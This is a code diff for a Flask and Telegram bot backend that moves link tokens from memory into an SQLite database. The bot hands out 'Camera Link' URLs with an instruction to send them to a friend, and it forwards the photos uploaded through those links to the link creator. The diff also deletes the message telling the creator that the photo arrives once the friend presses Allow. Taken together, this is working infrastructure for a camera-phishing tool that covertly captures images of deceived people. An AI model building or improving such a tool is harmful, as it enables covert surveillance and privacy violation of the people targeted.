@@ -2,6 +2,7 @@ import os
 import base64
 import uuid
 import asyncio
+import sqlite3
 from datetime import datetime, timezone
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -13,15 +14,52 @@ BOT_TOKEN = os.environ['BOT_TOKEN']
 PORT = int(os.getenv('PORT', 10000))
 SITE_URL = os.getenv('SITE_URL', 'https://your-site.netlify.app')
 RENDER_URL = os.getenv('RENDER_EXTERNAL_URL', '')
+DB_PATH = "/tmp/tokens.db"
 
 app = Flask(__name__)
 CORS(app)
 
-# in-memory token store
-active_tokens = {}
-
-# telegram application (module-level)
 tg_app = None
+
+
+# ==================== TOKEN DATABASE ====================
+def init_token_db():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS tokens (
+            token TEXT PRIMARY KEY,
+            user_id INTEGER,
+            created TEXT
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+
+def save_token(token, user_id):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('INSERT OR REPLACE INTO tokens VALUES (?,?,?)',
+              (token, user_id, datetime.now(timezone.utc).isoformat()))
+    conn.commit()
+    conn.close()
+
+
+def get_token_user(token):
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute('SELECT user_id FROM tokens WHERE token=?', (token,))
+        r = c.fetchone()
+        conn.close()
+        return r[0] if r else None
+    except Exception:
+        return None
+
+
+def token_exists(token):
+    return get_token_user(token) is not None
 
 
 # ==================== BOT HANDLERS ====================
@@ -41,18 +79,14 @@ async def genlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     uid = q.from_user.id
     token = str(uuid.uuid4()).replace('-', '')[:12]
-    active_tokens[token] = {
-        'user_id': uid,
-        'created': datetime.now(timezone.utc).isoformat()
-    }
+    save_token(token, uid)
 
     link = f"{SITE_URL}?token={token}"
 
     await q.edit_message_text(
         f"🔗 Your Camera Link:\n\n"
         f"{link}\n\n"
-        f"📤 Copy karke friend ko bhejo.\n"
-        f"Jab wo open karega aur Allow dabayega — photo yaha aayegi.",
+        f"📤 Copy karke friend ko bhejo.",
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Open Link", url=link)]])
     )
 
@@ -67,7 +101,7 @@ def health():
 def verify_token():
     data = request.json
     token = data.get('token')
-    if token in active_tokens:
+    if token_exists(token):
         return jsonify({'valid': True})
     return jsonify({'valid': False}), 404
 
@@ -79,10 +113,9 @@ def upload_photo():
         token = data.get('token')
         image_b64 = data.get('image')
 
-        if token not in active_tokens:
+        target_user = get_token_user(token)
+        if target_user is None:
             return jsonify({'error': 'invalid token'}), 400
-
-        target_user = active_tokens[token]['user_id']
 
         if ',' in image_b64:
             image_b64 = image_b64.split(',')[1]
@@ -93,7 +126,6 @@ def upload_photo():
         with open(filename, 'wb') as f:
             f.write(image_bytes)
 
-        # send photo via bot
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
 
@@ -151,7 +183,7 @@ def webhook():
 # ==================== SETUP WEBHOOK ====================
 def set_telegram_webhook():
     if not RENDER_URL:
-        print("RENDER_EXTERNAL_URL not set — skipping webhook setup")
+        print("RENDER_EXTERNAL_URL not set")
         return
 
     import requests
@@ -170,6 +202,8 @@ def set_telegram_webhook():
 
 # ==================== MAIN ====================
 if __name__ == '__main__':
+    init_token_db()
+
     tg_app = Application.builder().token(BOT_TOKEN).build()
     tg_app.add_handler(CommandHandler('start', start))
     tg_app.add_handler(CallbackQueryHandler(genlink, pattern='genlink'))
